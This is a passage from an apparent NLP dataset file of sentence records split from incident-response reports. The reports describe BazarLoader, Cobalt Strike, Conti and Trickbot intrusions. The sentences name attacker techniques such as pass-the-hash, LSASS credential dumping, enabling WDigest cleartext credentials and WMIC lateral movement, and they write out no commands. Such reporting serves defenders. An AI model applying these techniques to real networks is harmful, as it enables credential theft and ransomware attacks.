        "report": "r-dfir-23",
        "line": 102,
        "index": 6129
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S103",
        "text": "Multiple sensitive files were exfiltrated but before the threat actors could take any further action inside the network, they were evicted from the network.",
        "type": "",
        "report": "r-dfir-23",
        "line": 103,
        "index": 6130
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S104",
        "text": "BazarLoader infections currently tend to materialize into Conti ransomware, and many of the TTP\u2019s of the infection mimic the instructions from the leaked Conti manual.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 104,
        "index": 6131
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S105",
        "text": "Information posted from @AltShiftPrtScn based on an IR engagement where the threat actors already had domain admin on the network two months prior meeting their final objectives.",
        "type": "",
        "report": "r-dfir-23",
        "line": 105,
        "index": 6132
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S0",
        "text": "BazarLoader has continued to be one of the preeminent initial access brokers for ransomware threat actor access.",
        "type": "",
        "report": "r-dfir-24",
        "line": 0,
        "index": 6133
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S1",
        "text": "For this intrusion we don\u2019t know the initial campaign that deployed the malware but based on previous information, we can assess with high confidence that the delivery vector was a malicious email campaign.",
        "type": "",
        "report": "r-dfir-24",
        "line": 1,
        "index": 6134
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S2",
        "text": "At the time of the intrusion, the group was favoring zip attachments with malicious javascript files to download the BazarLoader malware.",
        "type": "",
        "report": "r-dfir-24",
        "line": 2,
        "index": 6135
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S3",
        "text": "However BazarLoader has also been used with Word and Excel documents as well.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 3,
        "index": 6136
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S4",
        "text": "In this case we observed the initial activity beginning with a BazarLoader DLL.",
        "type": "",
        "report": "r-dfir-24",
        "line": 4,
        "index": 6137
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S5",
        "text": "Upon initial execution on the beachhead, the malware made an initial connection to command and control, and then a few minutes later it performed discovery tasks on the host using Microsoft utilities like Net and Nltest to discover the domain and users of interest.",
        "type": "",
        "report": "r-dfir-24",
        "line": 5,
        "index": 6138
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S6",
        "text": "like domain administrators.",
        "type": "",
        "report": "r-dfir-24",
        "line": 6,
        "index": 6139
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S7",
        "text": "After this activity, the host went quiet for about one hour before downloading and executing a Cobalt Strike beacon DLL.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 7,
        "index": 6140
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S8",
        "text": "The threat actors used Cobalt Strike to run additional discovery tasks using Microsoft utilities like net, ping, systeminfo, and taskmanager.",
        "type": "",
        "report": "r-dfir-24",
        "line": 8,
        "index": 6141
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S9",
        "text": "The threat actors then began using pass the hash with various accounts which continued several times throughout the intrusion.",
        "type": "",
        "report": "r-dfir-24",
        "line": 9,
        "index": 6142
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S10",
        "text": "To see what machines were active in the environment, the threat actors scanned the network for SMB.",
        "type": "",
        "report": "r-dfir-24",
        "line": 10,
        "index": 6143
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S11",
        "text": "Around two and a half hours into the intrusion the threat actors began lateral movement.",
        "type": "",
        "report": "r-dfir-24",
        "line": 11,
        "index": 6144
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S12",
        "text": "Lateral movement began by the threat actor transferring an executable to a remote system and then executing it using wmic.",
        "type": "",
        "report": "r-dfir-24",
        "line": 12,
        "index": 6145
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S13",
        "text": "This was the primary lateral movement option favored by the threat actor, however PowerShell Cobalt Strike beacons, service executable Cobalt Strike beacons, and RDP were all used, but less commonly.",
        "type": "",
        "report": "r-dfir-24",
        "line": 13,
        "index": 6146
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S14",
        "text": "Once on remote systems the threat actor used Cobalt Strike to dump lsass memory for further credentials.",
        "type": "",
        "report": "r-dfir-24",
        "line": 14,
        "index": 6147
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S15",
        "text": "After this phase completed, the threat actor\u2019s activity faded but the Cobalt Strike continued to beacon out to the C2 server.",
        "type": "",
        "report": "r-dfir-24",
        "line": 15,
        "index": 6148
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S16",
        "text": "About 12 hours later the threat actors became active again.",
        "type": "",
        "report": "r-dfir-24",
        "line": 16,
        "index": 6149
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S17",
        "text": "From the domain controller the threat actors continued further lateral movement to more servers in the environment.",
        "type": "",
        "report": "r-dfir-24",
        "line": 17,
        "index": 6150
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S18",
        "text": "They also continued further discovery activity running PowerShell scripts to discover the disk utilization of hosts, review user last login time per host, assess the installed anti-virus software, and track which hosts were online for the threat actors to target.",
        "type": "",
        "report": "r-dfir-24",
        "line": 18,
        "index": 6151
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S19",
        "text": "When the threat actors identified the file server, their method for data exfiltration was straightforward to a fault.",
        "type": "",
        "report": "r-dfir-24",
        "line": 19,
        "index": 6152
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S20",
        "text": "They downloaded WinSCP from the project website, installed it on the file server and proceeded to exfiltrate data from the server using SCP to a VPS host they controlled in Romania.",
        "type": "",
        "report": "r-dfir-24",
        "line": 20,
        "index": 6153
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S21",
        "text": "Around 31 hours after initial access to the environment, the threat actors felt they were ready to complete their final objectives.",
        "type": "",
        "report": "r-dfir-24",
        "line": 21,
        "index": 6154
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S22",
        "text": "RDP activity was seen from several hosts and an executable named test.exe was transferred to several endpoints.",
        "type": "",
        "report": "r-dfir-24",
        "line": 22,
        "index": 6155
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S23",
        "text": "This test file was the Conti ransomware executable, and the threat actors decided to test in a controlled manner before running the full domain ransomware deployment.",
        "type": "",
        "report": "r-dfir-24",
        "line": 23,
        "index": 6156
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S24",
        "text": "Like before, these \u201cunit tests,\u201d were performed using wmic to execute the files remotely on the endpoints.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 24,
        "index": 6157
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S25",
        "text": "The threat actors must have confirmed quickly that their tests were successful as within minutes they dropped test.exe renamed to backup.exe on two servers in the environment and executed manually via their RDP sessions.",
        "type": "",
        "report": "r-dfir-24",
        "line": 25,
        "index": 6158
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S26",
        "text": "When executed in this manner the ransomware mounts all remote C$ drives in the local network and proceeds to encrypt the contents over the SMB connection.",
        "type": "",
        "report": "r-dfir-24",
        "line": 26,
        "index": 6159
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S27",
        "text": "At this point, the Time to Ransom (TTR) for the threat actors was just shy of 32 hours since initial access.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 27,
        "index": 6160
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S28",
        "text": "In this case we did not observe the initial delivery for the malware.",
        "type": "",
        "report": "r-dfir-24",
        "line": 28,
        "index": 6161
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S29",
        "text": "BazarLoader however tends to arrive in an environment via malicious email campaigns and in a few cases its been reported via call centers social engineering users to load the malware.",
        "type": "",
        "report": "r-dfir-24",
        "line": 29,
        "index": 6162
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S30",
        "text": "Seeing that this starts with a DLL file it is more likely that this was related to an email campaign using malicious zipped Javascript files.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 30,
        "index": 6163
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S31",
        "text": "Initial execution occurred via the Bazarloader DLL being executed by rundll32.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 31,
        "index": 6164
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S32",
        "text": "About an hour after the initial execution on the beachhead, a Cobalt Strike beacon was executed also with rundll32.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 32,
        "index": 6165
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S33",
        "text": "The threat actors made use of pass the hash techniques to try to escalate privileges during the intrusion.",
        "type": "",
        "report": "r-dfir-24",
        "line": 33,
        "index": 6166
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S34",
        "text": "Various accounts were targeted including a Guest account initially.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 34,
        "index": 6167
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S35",
        "text": "Process injection was seen from the Cobalt Strike beacon into a svchost process running with System level privilege.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 35,
        "index": 6168
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S36",
        "text": "While in the environment they injected Cobalt Strike beacons into many processes.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 36,
        "index": 6169
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S37",
        "text": "Processes with CS beacon injected or running\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 37,
        "index": 6170
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S38",
        "text": "The threat actors were seen dumping credentials out of lsass memory across the domain.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 38,
        "index": 6171
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S39",
        "text": "The BazarLoader malware on the beachhead began discovery actions around 20 minutes after the initial execution.",
        "type": "",
        "report": "r-dfir-24",
        "line": 39,
        "index": 6172
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S40",
        "text": "The discovery commands utilize the familiar built in Microsoft utilities.",
        "type": "",
        "report": "r-dfir-24",
        "line": 40,
        "index": 6173
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S41",
        "text": "The Cobalt Strike beacon ran additional discovery tasks on the beachhead.",
        "type": "",
        "report": "r-dfir-24",
        "line": 41,
        "index": 6174
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S42",
        "text": "Again built in Microsoft utilities were utilized.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 42,
        "index": 6175
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S43",
        "text": "Throughout the intrusion the threat actor checked the time of systems with:\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 43,
        "index": 6176
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S44",
        "text": "From an svchost process injected with a Cobalt Strike beacon, SMB scanning was performed across the environment.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 44,
        "index": 6177
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S45",
        "text": "From the domain controller the threat actor ran an encoded PowerShell command to review the size and condition of hard drives across the environment.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 45,
        "index": 6178
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S46",
        "text": "Powersploit modules like Get-NetComputer were seen used by the threat actor from the domain controller\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 46,
        "index": 6179
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S47",
        "text": "The script Get-DataInfo.ps1, which has been used in many intrusions this past year, was also employed.",
        "type": "",
        "report": "r-dfir-24",
        "line": 47,
        "index": 6180
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S48",
        "text": "This file was started by the use of start.bat, which has been seen paired with this script repeatedly.",
        "type": "",
        "report": "r-dfir-24",
        "line": 48,
        "index": 6181
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S49",
        "text": "The contents of Get-DataInfo.ps1 provide the threat actor with very specific details of the environment.",
        "type": "",
        "report": "r-dfir-24",
        "line": 49,
        "index": 6182
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S50",
        "text": "This includes things like disk size, connectivity, antivirus software, and backup software.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 50,
        "index": 6183
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S51",
        "text": "This script was first reported used by threat actors deploying the Ryuk ransomware strain.",
        "type": "",
        "report": "r-dfir-24",
        "line": 51,
        "index": 6184
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S52",
        "text": "The Microsoft Active Directory PowerShell module was also imported and used for discovery tasks.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 52,
        "index": 6185
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S53",
        "text": "For lateral movement the threat actors relied heavily on copying executable files over SMB and then executing them via remote WMIC calls\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 53,
        "index": 6186
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S54",
        "text": "While executables and wmic were the preferred options for the threat actor, they did employ several other techniques.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 54,
        "index": 6187
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S55",
        "text": "Remote Cobalt Strike beacons were started with services and PowerShell several times in the environment.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 55,
        "index": 6188
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S56",
        "text": "During the final stages the threat actor used RDP to move between a few servers as part of their final actions.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 56,
        "index": 6189
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S57",
        "text": "At that time, a Cobalt Strike beacon executable was executed as a service on a remote host for testing the final ransom deployment.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 57,
        "index": 6190
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S58",
        "text": "This server was seen communicating with multiple internal systems:\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 58,
        "index": 6191
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S59",
        "text": "In addition to these command and control methods, one more network anomaly was observed.",
        "type": "",
        "report": "r-dfir-24",
        "line": 59,
        "index": 6192
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S60",
        "text": "This was not used for primary command and control and the amount of data sent was small so we do not know the full intentions of the activity but several critical systems like domain controllers and file servers made connections to TOR nodes initiated by the threat actors.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 60,
        "index": 6193
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S61",
        "text": "The threat actor on the second day of the intrusion downloaded WinSCP to the file server and proceeded to install the program there.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 61,
        "index": 6194
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S62",
        "text": "The threat actor then proceeded to connect over port 22 to a server in Romania.",
        "type": "",
        "report": "r-dfir-24",
        "line": 62,
        "index": 6195
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S63",
        "text": "As the traffic was encrypted we can\u2019t conclusively determine what data was exfiltrated.",
        "type": "",
        "report": "r-dfir-24",
        "line": 63,
        "index": 6196
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S64",
        "text": "However we can infer that the choice to deploy on the file server was due to the data present and ease to move the data.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 64,
        "index": 6197
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S65",
        "text": "Another data point is that following the exfiltration canary documents present in the shares reported in as being opened from an IP on a Virtual Private Host provider in New York, USA.",
        "type": "",
        "report": "r-dfir-24",
        "line": 65,
        "index": 6198
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S66",
        "text": "During the overnight hours of the 2nd day the threat actors began moving on their final objectives.",
        "type": "",
        "report": "r-dfir-24",
        "line": 66,
        "index": 6199
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S67",
        "text": "This included testing their ransomware in the compromised environment before deploying across the domain.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 67,
        "index": 6200
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S68",
        "text": "They initiated RDP connections and a Cobalt Strike beacon executable file to a endpoint not yet interacted with by the threat actors.",
        "type": "",
        "report": "r-dfir-24",
        "line": 68,
        "index": 6201
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S69",
        "text": "The threat actor then transferred a Conti executable file to several endpoints named test.exe.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 69,
        "index": 6202
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S70",
        "text": "These test ransom files were then called remotely using wmic as seen in the previous lateral movement activity.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 70,
        "index": 6203
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S71",
        "text": "After testing on several endpoints, the threat actors dropped a renamed version of the file on several servers in the environment and executed by hand using their RDP session.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 71,
        "index": 6204
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S72",
        "text": "When executed in this manner, the ransomware payload attempts to spread laterally over SMB.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 72,
        "index": 6205
    },
    {
        "id": "dfir-reports-filtered/r-dfir-24.md:::S73",
        "text": "From there, the threat actors left the environment with this note and domain wide encryption completed about 32 hours after the initial beachhead BazarLoader was executed.\n",
        "type": "",
        "report": "r-dfir-24",
        "line": 73,
        "index": 6206
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S0",
        "text": "We assess with medium confidence that the initial threat vector for this intrusion was a password protected archive, delivered via malspam campaigns.",
        "type": "",
        "report": "r-dfir-25",
        "line": 0,
        "index": 6207
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S1",
        "text": "The zip attachment would likely contain a Word or Excel document with macros, which upon execution, would start a Trickbot infection.",
        "type": "",
        "report": "r-dfir-25",
        "line": 1,
        "index": 6208
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S2",
        "text": "The Trickbot payload injected itself into the system process wermgr.exe \u2014 the Windows process responsible for error reporting.",
        "type": "",
        "report": "r-dfir-25",
        "line": 2,
        "index": 6209
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S3",
        "text": "The threat actor then utilized built-in Windows utilities such as net.exe, ipconfig.exe and nltest.exe for performing internal reconnaissance.",
        "type": "",
        "report": "r-dfir-25",
        "line": 3,
        "index": 6210
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S4",
        "text": "Within two minutes of the discovery activity, WDigest authentication was enabled (disabled by default in Windows 10) in the registry on the infected host.",
        "type": "",
        "report": "r-dfir-25",
        "line": 4,
        "index": 6211
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S5",
        "text": "This enforces credential information to be saved in cleartext in memory.",
        "type": "",
        "report": "r-dfir-25",
        "line": 5,
        "index": 6212
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S6",
        "text": "Shortly after applying this registry modification, the LSASS process was dumped to disk using the Sysinternals tool ProcDump.\n",
        "type": "",
        "report": "r-dfir-25",
        "line": 6,
        "index": 6213
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S7",
        "text": "Having obtained sensitive credentials, WMIC was used to deploy a fake password manager application across multiple systems in the network.",
        "type": "",
        "report": "r-dfir-25",
        "line": 7,
        "index": 6214
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S8",
        "text": "The installed software package appears to have been trying to masquerade as the 1Password windows installer and password vault software.",
        "type": "",
        "report": "r-dfir-25",
        "line": 8,
        "index": 6215
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S9",
        "text": "The fake installer drops and executes a file embedded with Cobalt Strike stager shellcode, which attempts to fetch a CS beacon.",
        "type": "",
        "report": "r-dfir-25",
        "line": 9,
        "index": 6216
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S10",
        "text": "With the additional remote sessions, the attackers ran encoded PowerShell commands, one of which loaded the Active Directory module and collected information about Windows computers in the domain.",
        "type": "",
        "report": "r-dfir-25",
        "line": 10,
        "index": 6217
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S11",
        "text": "The results were dumped into a CSV file.",
        "type": "",
        "report": "r-dfir-25",
        "line": 11,
        "index": 6218
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S12",
        "text": "Another PowerShell script, named \u201cGet-DataInfo.ps1\u201d, aimed to provide a list of active systems including its anti-virus state.",
        "type": "",
        "report": "r-dfir-25",
        "line": 12,
        "index": 6219
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S13",
        "text": "This behavior was also observed in one of our previous intrusion cases.",
        "type": "",
        "report": "r-dfir-25",
        "line": 13,
        "index": 6220
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S14",
        "text": "No exfiltration of data or impact to the systems was observed.",
        "type": "",
        "report": "r-dfir-25",
        "line": 14,
        "index": 6221
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S15",
        "text": "It is unclear why the actors decided not to continue with their operation.\n",
        "type": "",
        "report": "r-dfir-25",
        "line": 15,
        "index": 6222
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S16",
        "text": "The Trickbot payload seen during this intrusion was likely spread via a weaponized Word or Excel file from an email campaign.\n",
        "type": "",
        "report": "r-dfir-25",
        "line": 16,
        "index": 6223
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S17",
        "text": "The Trickbot payload (1a5f3ca6597fcccd3295ead4d22ce70b.exe) was manually executed on a single endpoint.",
        "type": "",
        "report": "r-dfir-25",
        "line": 17,
        "index": 6224
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S18",
        "text": "The visual representation of process tree execution pattern on beachhead can be seen below.\n",
        "type": "",
        "report": "r-dfir-25",
        "line": 18,
        "index": 6225
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S19",
        "text": "Upon execution, the payload injects into the wermgr.exe process.",
        "type": "",
        "report": "r-dfir-25",
        "line": 19,
        "index": 6226
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S20",
        "text": "The injected wermgr.exe process then creates a new folder in the user\u2019s AppData directory.",
        "type": "",
        "report": "r-dfir-25",
        "line": 20,
        "index": 6227
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S21",
        "text": "As typically seen in Trickbot infections, it drops a copy of itself into this folder along with its encrypted config (settings.ini) and a batch file (launcher.bat).\n",
        "type": "",
        "report": "r-dfir-25",
        "line": 21,
        "index": 6228
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S22",
        "text": "Trickbot utilized the same instance of wermgr.exe to load Cobalt Strike beacons into memory using PowerShell, which remained active throughout the intrusion:\n",
        "type": "",
        "report": "r-dfir-25",
        "line": 22,
        "index": 6229
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S23",
        "text": "The fake setup installer (Setup1.exe) which was seen during the lateral movement stage, was dropped and executed on multiple systems, including the domain controllers.",
        "type": "",
        "report": "r-dfir-25",
        "line": 23,
        "index": 6230
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S24",
        "text": "The launcher.bat file, which triggers the Trickbot executable, is set to start via a scheduled task:\n",
        "type": "",
        "report": "r-dfir-25",
        "line": 24,
        "index": 6231
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S25",
        "text": "The GetSystem named pipe impersonation technique was observed to obtain SYSTEM-level privileges on the domain controller.\n",
        "type": "",
        "report": "r-dfir-25",
        "line": 25,
        "index": 6232
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S26",
        "text": "To prepare for code injection, the Trickbot executable allocated memory in the address space of the Windows system process \u201cwermgr.exe\u201d (Windows Error Reporting Module).",
        "type": "",
        "report": "r-dfir-25",
        "line": 26,
        "index": 6233
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S27",
        "text": "The injected wermgr.exe process then called svchost.exe (without any command line arguments), which in turn was used to run various reconnaissance commands.",
        "type": "",
        "report": "r-dfir-25",
        "line": 27,
        "index": 6234
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S28",
        "text": "More about that in the \u201cDiscovery\u201d section below.",
        "type": "",
        "report": "r-dfir-25",
        "line": 28,
        "index": 6235
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S29",
        "text": "The threat actor enabled WDigest authentication by changing the value of the \u201cUseLogonCredential\u201d object from 0 to 1 in the Windows registry.",
        "type": "",
        "report": "r-dfir-25",
        "line": 29,
        "index": 6236
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S30",
        "text": "This enforces the storage of credentials in plaintext on future logins.",
        "type": "",
        "report": "r-dfir-25",
        "line": 30,
        "index": 6237
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S31",
        "text": "On the initial beachhead, various discovery commands were executed from the injected svchost.exe process.\n",
        "type": "",
        "report": "r-dfir-25",
        "line": 31,
        "index": 6238
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S32",
        "text": "A diverse set of reconnaissance commands were also observed from the Cobalt Strike beacons:\n",
        "type": "",
        "report": "r-dfir-25",
        "line": 32,
        "index": 6239
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S33",
        "text": "Using the WMI class \u201cwin32_logicaldisk\u201d, (free) disk space information was gathered of the attached (network) drive letters.\n",
        "type": "",
        "report": "r-dfir-25",
        "line": 33,
        "index": 6240
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S34",
        "text": "The threat actor made use of the Active Directory module to save hostname, OS and last logon date information of all AD Computer objects in a CSV file.",
        "type": "",
        "report": "r-dfir-25",
        "line": 34,
        "index": 6241
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S35",
        "text": "In addition, all of the IP-addresses in the LAN were scanned on port 445/SMB, potentially to identify other interesting targets.\n",
        "type": "",
        "report": "r-dfir-25",
        "line": 35,
        "index": 6242
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S36",
        "text": "The following set of files were copied to the domain controller:\n",
        "type": "",
        "report": "r-dfir-25",
        "line": 36,
        "index": 6243
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S37",
        "text": "Already covered in a previous case, the batch and PowerShell scripts serve as a data collector to enumerate hosts within the target environment.",
        "type": "",
        "report": "r-dfir-25",
        "line": 37,
        "index": 6244
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S38",
        "text": "It collects data about active/dead hosts, disks, and installed software; and stores it in a zip file.\n",
        "type": "",
        "report": "r-dfir-25",
        "line": 38,
        "index": 6245
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S39",
        "text": "A file named Setup1.exe was dropped on multiple systems within the environment and executed using WMIC.\n",
        "type": "",
        "report": "r-dfir-25",
        "line": 39,
        "index": 6246
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S40",
        "text": "In an attempt to blend in, the Setup1.exe file acts as a fake installer for \u201c1Password\u201d, a popular online password manager.",
        "type": "",
        "report": "r-dfir-25",
        "line": 40,
        "index": 6247
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S41",
        "text": "When the file is executed, it drops various files in the user\u2019s AppData directory, including \u201cfilepass.exe\u201d, which is started as a child process.",
        "type": "",
        "report": "r-dfir-25",
        "line": 41,
        "index": 6248
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S42",
        "text": "It appears the threat actors used LPUB3D as a shell for this install, as all the folders and some of the dlls are from LPub3D, an Open Source WYSIWYG editing application for creating LEGO\u00ae style digital building instructions.",
        "type": "",
        "report": "r-dfir-25",
        "line": 42,
        "index": 6249
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S43",
        "text": "Filepass.exe then loads an unsigned DLL named theora2.dll:\n",
        "type": "",
        "report": "r-dfir-25",
        "line": 43,
        "index": 6250
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S44",
        "text": "theora2.dll reads the data from an XML-file named \u201ccds.xml\u201d.",
        "type": "",
        "report": "r-dfir-25",
        "line": 44,
        "index": 6251
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S45",
        "text": "This file is stored in the same directory (AppData\\Roaming\\1Password).",
        "type": "",
        "report": "r-dfir-25",
        "line": 45,
        "index": 6252
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S46",
        "text": "This file seems to contain the XML documentation (in Russian) of the System.IO package.\n",
        "type": "",
        "report": "r-dfir-25",
        "line": 46,
        "index": 6253
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S47",
        "text": "If we scroll down in the XML-file, we will find data patterns which seem to be obfuscated and unreadable:\n",
        "type": "",
        "report": "r-dfir-25",
        "line": 47,
        "index": 6254
    },
    {
        "id": "dfir-reports-filtered/r-dfir-25.md:::S48",
        "text": "A subset of the file buffer (cds.xml), which contains the obfuscated data patterns, is saved into a separate memory location.",
        "type": "",
        "report": "r-dfir-25",
        "line": 48,
        "index": 6255
